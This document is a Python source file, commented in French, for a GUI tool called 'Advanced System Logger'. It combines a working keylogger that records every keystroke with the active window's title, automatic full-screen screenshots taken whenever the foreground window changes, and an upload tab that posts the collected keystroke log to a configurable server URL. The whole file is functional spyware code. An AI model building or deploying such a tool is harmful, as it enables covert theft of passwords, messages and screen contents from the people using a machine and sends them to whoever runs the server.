import ttkbootstrap as ttk
from ttkbootstrap.constants import *
import threading
import time
import os
import ctypes  # Pour l'API Windows (remplace win32gui pour plus de facilité)
from datetime import datetime
from tkinter import filedialog, StringVar, BooleanVar, END, LEFT, RIGHT, BOTH, YES, W, E

# --- 1. GESTION DES IMPORTS ---
try:
    import requests
    from pynput import keyboard
    from PIL import ImageGrab  # Remplace mss pour une intégration plus simple
except ImportError as e:
    print(f"ERREUR CRITIQUE : Il manque des modules Python.\nErreur : {e}")
    print("Exécutez : pip install ttkbootstrap pynput requests Pillow")

# --- 2. CONFIGURATION API WINDOWS (Le secret pour les titres détaillés) ---
# Cette partie remplace 'pygetwindow' et utilise la méthode native de Windows
# pour obtenir exactement ce que vous voyez dans la barre des tâches.
if os.name == 'nt':
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    def get_detailed_window_title():
        """Récupère le titre EXACT via l'API Windows."""
        h_wnd = user32.GetForegroundWindow()  # Récupère la fenêtre active
        length = user32.GetWindowTextLengthW(h_wnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(h_wnd, buf, length + 1)
        
        title = buf.value
        if not title:
            return "Desktop / Inconnu"
        return title
else:
    # Fallback pour Mac/Linux
    def get_detailed_window_title():
        return "OS non-Windows (Titre indisponible)"

# --- 3. VARIABLES GLOBALES ---
# Ces variables sont partagées par toute l'application
global_key_listener = None
keylogger_running = False
last_window_title = "" 
screenshot_monitor_thread = None
screenshot_monitor_running = False

# --- 4. FONCTION CAPTURE D'ÉCRAN (Basée sur votre capture.py) ---
def internal_take_screenshot():
    """Prend une capture et la sauvegarde dans le dossier screenshots."""
    try:
        if not os.path.exists("screenshots"):
            os.makedirs("screenshots")
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshots/cap_{timestamp}.png"
        
        # Capture tout l'écran
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot.save(filename)
        print(f"[CAPTURE] Sauvegardée : {filename}")
        return True
    except Exception as e:
        print(f"[ERREUR CAPTURE] : {e}")
        return False

# --- 5. MOTEUR KEYLOGGER (Basé sur keylogwin.py) ---

def on_press(key):
    global last_window_title
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Utilisation de la détection API Windows
    current_window_title = get_detailed_window_title()

    try:
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            # 1. Détection changement de fenêtre
            if current_window_title != last_window_title:
                log_msg = f'\n--- [WIN] Changed to: {current_window_title} at {timestamp} ---\n'
                f.write(log_msg)
                last_window_title = current_window_title
                print(f"[FENÊTRE] {current_window_title}")  # Debug console

            # 2. Enregistrement de la touche
            k = str(key).replace("'", "")
            if "Key." in k:
                # Touches spéciales (Espace, Entrée, etc.)
                if k == "Key.space":
                    f.write(" ")
                elif k == "Key.enter":
                    f.write("\n")
                else:
                    f.write(f' [{k}] ')
            else:
                # Lettres normales
                f.write(k)
                
    except Exception as e:
        print(f"Erreur écriture log: {e}")

def start_keylogger_thread():
    """Lance le listener dans un thread pour ne pas bloquer l'interface."""
    global global_key_listener, last_window_title
    last_window_title = "" 
    global_key_listener = keyboard.Listener(on_press=on_press)
    global_key_listener.start()

# --- 6. MOTEUR SURVEILLANCE CAPTURE (Basé sur capture.py) ---

def monitor_loop():
    """Surveille les changements de fenêtres pour prendre des photos."""
    global screenshot_monitor_running
    print("Début boucle surveillance capture...")
    
    local_last_title = ""
    
    while screenshot_monitor_running:
        try:
            curr = get_detailed_window_title()
            
            # Si le titre change et n'est pas vide/bureau
            if curr != local_last_title and "Desktop" not in curr:
                print(f"[AUTO-CAPTURE] Changement vers : {curr}")
                internal_take_screenshot()
                local_last_title = curr
            
            time.sleep(1)  # Vérifie toutes les secondes
        except Exception as e:
            print(f"Erreur Loop Monitor: {e}")
            break

# --- 7. MOTEUR ENVOI SERVEUR (Basé sur reqlogger.py) ---

def send_logs_thread(url, filepath, status_var):
    status_var.set("Envoi en cours...")
    try:
        if not os.path.exists(filepath):
            status_var.set("Erreur: Fichier introuvable")
            return

        with open(filepath, 'r', encoding='utf-8') as f:
            data = f.read()
        
        # Envoi au serveur
        response = requests.post(url, data={'log': data}, timeout=10)
        
        if response.status_code == 200:
            status_var.set("✅ Logs envoyés avec succès!")
        else:
            status_var.set(f"⚠️ Erreur Serveur: {response.status_code}")
            
    except Exception as e:
        status_var.set(f"❌ Erreur Connexion: {str(e)[:20]}...")
        print(e)


# ==============================================================================
# INTERFACE GRAPHIQUE (GUI) - RECONSTRUCTION COMPLÈTE
# ==============================================================================

def main_gui():
    app = ttk.Window(themename="superhero")
    app.title("Advanced System Logger (Integrated)")
    app.geometry("950x700")
    
    # --- Variables de contrôle ---
    status_kl = StringVar(value="Statut: INACTIF")
    status_upload = StringVar(value="En attente")
    var_auto_screen = BooleanVar(value=False)
    var_url = StringVar(value="http://localhost:8000/logs")
    var_logfile = StringVar(value="keylog.txt")

    # --- Fonctions Commandes ---
    def action_toggle_kl():
        global keylogger_running
        if not keylogger_running:
            start_keylogger_thread()
            keylogger_running = True
            status_kl.set("Statut: 🟢 ENREGISTREMENT EN COURS")
            btn_kl.config(bootstyle="danger", text="Arrêter Keylogger")
        else:
            if global_key_listener: global_key_listener.stop()
            keylogger_running = False
            status_kl.set("Statut: 🔴 INACTIF")
            btn_kl.config(bootstyle="success", text="Démarrer Keylogger")

    def action_toggle_monitor():
        global screenshot_monitor_running, screenshot_monitor_thread
        if var_auto_screen.get():
            if not screenshot_monitor_running:
                screenshot_monitor_running = True
                screenshot_monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
                screenshot_monitor_thread.start()
        else:
            screenshot_monitor_running = False

    def action_manual_snap():
        if internal_take_screenshot():
            ttk.dialogs.Messagebox.show_info("Capture", "Image sauvegardée dans /screenshots")
    
    def action_upload():
        threading.Thread(target=send_logs_thread, 
                         args=(var_url.get(), var_logfile.get(), status_upload), 
                         daemon=True).start()

    def action_read_log():
        # Affiche le contenu du fichier dans la zone texte
        txt_display.delete('1.0', END)
        if os.path.exists(var_logfile.get()):
            with open(var_logfile.get(), 'r', encoding='utf-8') as f:
                content = f.read()
                txt_display.insert(END, content)
        else:
            txt_display.insert(END, "Fichier log introuvable.")

    # --- STRUCTURE DE LA PAGE ---
    
    # 1. En-tête
    header = ttk.Frame(app, padding=10, bootstyle="secondary")
    header.pack(fill=X)
    ttk.Label(header, text="SYSTEM MONITOR & LOGGER", font=("Segoe UI", 20, "bold"), bootstyle="inverse-secondary").pack()

    # 2. Conteneur principal (Tabs)
    notebook = ttk.Notebook(app, bootstyle="primary")
    notebook.pack(fill=BOTH, expand=YES, padx=10, pady=10)

    # --- ONGLET 1 : CONTRÔLE ---
    tab_control = ttk.Frame(notebook, padding=20)
    notebook.add(tab_control, text=" 🎮 Contrôle ")

    # Section Keylogger
    lf_kl = ttk.Labelframe(tab_control, text=" Keylogger ", padding=15, bootstyle="info")
    lf_kl.pack(fill=X, pady=10)
    
    lbl_status = ttk.Label(lf_kl, textvariable=status_kl, font=("Consolas", 14, "bold"))
    lbl_status.pack(pady=10)
    
    btn_kl = ttk.Button(lf_kl, text="Démarrer Keylogger", command=action_toggle_kl, bootstyle="success", width=40)
    btn_kl.pack(pady=5)
    
    ttk.Label(lf_kl, text="Note: Les fenêtres sont détectées via l'API Windows native.", font=("Arial", 8, "italic")).pack(pady=5)

    # Section Screenshots
    lf_screen = ttk.Labelframe(tab_control, text=" Captures d'écran ", padding=15, bootstyle="warning")
    lf_screen.pack(fill=X, pady=10)
    
    btn_snap = ttk.Button(lf_screen, text="📸 Capture Immédiate", command=action_manual_snap, bootstyle="warning-outline", width=40)
    btn_snap.pack(pady=5)
    
    cb_monitor = ttk.Checkbutton(lf_screen, text="Activer la surveillance automatique (Capture au changement de fenêtre)", 
                                 variable=var_auto_screen, command=action_toggle_monitor, bootstyle="round-toggle")
    cb_monitor.pack(pady=10)

    # --- ONGLET 2 : ANALYSE ---
    tab_analysis = ttk.Frame(notebook, padding=20)
    notebook.add(tab_analysis, text=" 📊 Analyse Log ")
    
    tool_frame = ttk.Frame(tab_analysis)
    tool_frame.pack(fill=X, pady=5)
    ttk.Button(tool_frame, text="🔄 Actualiser / Lire le fichier", command=action_read_log, bootstyle="info").pack(side=LEFT)
    
    txt_display = ttk.Text(tab_analysis, height=20, font=("Consolas", 10))
    txt_display.pack(fill=BOTH, expand=YES, pady=5)

    # --- ONGLET 3 : UPLOAD ---
    tab_upload = ttk.Frame(notebook, padding=20)
    notebook.add(tab_upload, text=" ☁️ Upload ")
    
    ttk.Label(tab_upload, text="Configuration Serveur (reqlogger)", font=("Arial", 12, "bold")).pack(pady=10)
    
    form_frame = ttk.Frame(tab_upload)
    form_frame.pack(pady=10)
    
    ttk.Label(form_frame, text="URL Serveur:").grid(row=0, column=0, padx=5, pady=5, sticky=E)
    ttk.Entry(form_frame, textvariable=var_url, width=40).grid(row=0, column=1, padx=5, pady=5)
    
    ttk.Label(form_frame, text="Fichier Log:").grid(row=1, column=0, padx=5, pady=5, sticky=E)
    ttk.Entry(form_frame, textvariable=var_logfile, width=40).grid(row=1, column=1, padx=5, pady=5)
    
    ttk.Button(tab_upload, text="Envoyer les données", command=action_upload, bootstyle="primary").pack(pady=20)
    ttk.Label(tab_upload, textvariable=status_upload, font=("Arial", 11)).pack()

    # Lancement
    app.mainloop()

if __name__ == "__main__":
    main_gui()